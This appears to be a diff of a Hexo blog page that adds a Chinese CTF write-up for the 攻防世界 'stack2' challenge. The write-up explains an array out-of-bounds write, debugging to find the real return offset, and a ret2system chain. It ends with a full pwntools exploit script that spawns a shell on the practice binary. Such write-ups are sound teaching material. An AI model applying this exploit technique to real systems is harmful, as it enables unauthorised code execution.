@@ -13,7 +13,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>Archives |  记录</title>
+      <title>攻防世界-stack2 |  记录</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -55,147 +55,190 @@
       
     <main class="content on">
       <section class="outer">
-  
-  
-  <article class="articles">
+  <article
+  id="post-攻防世界-stack2"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
     
-    
-    <h1 class="page-type-title">Archives</h1>
-    
-    
-  
-  
-  
-  
-  
-  
-  <div class="archives-wrap">
-    <div class="archive-year-wrap">
-      <a href="/archives/2022" class="archive-year">2022</a>
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  攻防世界-stack2
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2022/02/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-stack2/" class="article-date">
+  <time datetime="2022-02-12T13:34:24.000Z" itemprop="datePublished">2022-02-12</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">377</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">1 min</span>
+        </span>
+    </span>
+</div>
+ 
     </div>
-    <div class="archives">
       
-      <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2022/02/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-stack2/" class="archive-article-date">
-  <time datetime="2022-02-12T13:34:24.000Z" itemprop="datePublished">02/12</time>
-</a>
-       
-<h2 itemprop="name">
-  <a class="archive-article-title" href="/2022/02/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-stack2/"
-    >攻防世界-stack2</a> 
-</h2>
- 
 
-    </header>
-    
-    
-  </div>
-</article>
-      
-  
-  
-      <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2022/01/08/%E6%B5%8B%E8%AF%95/" class="archive-article-date">
-  <time datetime="2022-01-08T07:23:27.000Z" itemprop="datePublished">01/08</time>
-</a>
-       
-<h2 itemprop="name">
-  <a class="archive-article-title" href="/2022/01/08/%E6%B5%8B%E8%AF%95/"
-    >测试</a> 
-</h2>
- 
 
-    </header>
-    
-    
-  </div>
-</article>
-      
-  
-  
-  
-  </div>
-  </div>
-  
-  
-  <div class="archives-wrap">
-    <div class="archive-year-wrap">
-      <a href="/archives/2021" class="archive-year">2021</a>
-    </div>
-    <div class="archives">
-      
-      <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2021/12/06/pwn-%E7%AE%80%E5%8D%95%E7%9A%84%E7%88%86%E7%A0%B41-0/" class="archive-article-date">
-  <time datetime="2021-12-06T15:13:00.000Z" itemprop="datePublished">12/06</time>
-</a>
-       
-<h2 itemprop="name">
-  <a class="archive-article-title" href="/2021/12/06/pwn-%E7%AE%80%E5%8D%95%E7%9A%84%E7%88%86%E7%A0%B41-0/"
-    >pwn_简单的爆破1.0</a> 
-</h2>
- 
 
-    </header>
-    
-    
-  </div>
-</article>
-      
   
-  
-      <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2021/12/04/Minecraft-fabric-1-0/" class="archive-article-date">
-  <time datetime="2021-12-04T05:14:00.000Z" itemprop="datePublished">12/04</time>
-</a>
+    <div class="article-entry" itemprop="articleBody">
        
-<h2 itemprop="name">
-  <a class="archive-article-title" href="/2021/12/04/Minecraft-fabric-1-0/"
-    >Minecraft_fabric_1.0</a> 
-</h2>
+  <p>关键词：数组溢出，栈溢出</p>
+<p>检查防护，32位程序，开启了NX和cannry<br><img src="/images/pasted-10.png" alt="upload successful"><br>运行程序<br><img src="/images/pasted-11.png" alt="upload successful"><br>在ida中查看，程序中的change number功能可以溢出数组，更改数组任意位置的值。程序中存在hacktherede函数<br><img src="/images/pasted-12.png" alt="upload successful">到这里做题的思路基本就有了，通过数组溢出的漏洞直接更改return的地址为hackhere的地址。<br>然而在做题的过程中发现这题有大坑，首先是程序的入口和出口进行了微调，ida中查看的栈的偏移不准确。用gdb调试程序，在mov     [eax], cl和retn的位置下断点<br><img src="/images/pasted-13.png" alt="upload successful"></p>
+<p><img src="/images/pasted-14.png" alt="upload successful"><br>在mov eax，cl位置查看的返回地址是0xffffbd8c，而在retn位置查看的返回地址是0xffffbd9c<br><img src="/images/pasted-15.png" alt="upload successful"></p>
+<p><img src="/images/pasted-16.png" alt="upload successful"><br>所以真实的偏移地址是0x84，通过数组溢出更改返回地址，但是在第一次运行脚本时发现程序中没有bash，无法直接用后门函数后的shell。那么只能自己构造ROP，在程序中找到了“sh”的字符串，把system得plt地址以及sh的地址发送过去，可以成功获取shell。<br><img src="/images/pasted-17.png" alt="upload successful"><br>运行结果以及完整wp  </p>
+<p>from pwn import *<br>io = process(“./stack2”)<br>#io = remote(“111.200.241.244”,50757)<br>def SEND(aa,bb): </p>
+<pre><code>        io.sendlineafter(&#39;exit\n&#39;, b&#39;3&#39;)  
+        io.sendlineafter(&#39;to change:\n&#39;, str(aa))  
+        io.sendlineafter(&#39;new number:\n&#39;, str(bb))
+</code></pre>
+<p>system_add = 0x8048450<br>sh_add = 0x08048987<br>io.sendline(b’1’)<br>io.sendline(b’1’)<br>#system<br>SEND(0x84,0x50)<br>SEND(0x85,0x84)<br>SEND(0x86,0x04)<br>SEND(0x87,0x08)<br>#sh<br>SEND(0x8c,0x87)<br>SEND(0x8d,0x89)<br>SEND(0x8e,0x04)<br>SEND(0x8f,0x08)<br>io.sendline(b’5’)<br>#io.recv()<br>io.interactive()<br><img src="/images/pasted-18.png" alt="upload successful"></p>
  
-
-    </header>
-    
-    
-  </div>
-</article>
-      
-  
-  
-      <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      <a href="/2021/11/29/first-blog/" class="archive-article-date">
-  <time datetime="2021-11-29T11:01:05.000Z" itemprop="datePublished">11/29</time>
-</a>
-       
-<h2 itemprop="name">
-  <a class="archive-article-title" href="/2021/11/29/first-blog/"
-    >first blog</a> 
-</h2>
- 
-
-    </header>
-    
-    
-  </div>
-</article>
-      
+      <!-- reward -->
       
     </div>
-  </div>
-  
-  
+    
 
-  
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2022/02/12/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-stack2/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2022/01/08/%E6%B5%8B%E8%AF%95/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">测试</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
 </section>
       <footer class="footer">
   <div class="outer">
@@ -311,6 +354,22 @@
 <script src="/js/lazyload.min.js"></script>
 
 <!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
 
 <script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
 <link
